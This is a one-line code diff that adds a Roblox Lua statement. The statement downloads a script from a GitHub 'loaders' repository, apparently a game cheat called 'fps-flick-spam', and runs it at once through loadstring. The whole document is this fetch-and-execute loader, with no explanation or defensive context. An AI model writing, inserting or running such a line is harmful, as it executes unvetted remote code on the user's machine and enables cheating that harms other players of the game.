@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/fps-flick-spam0-yot5zabio3d36d.lua"))()
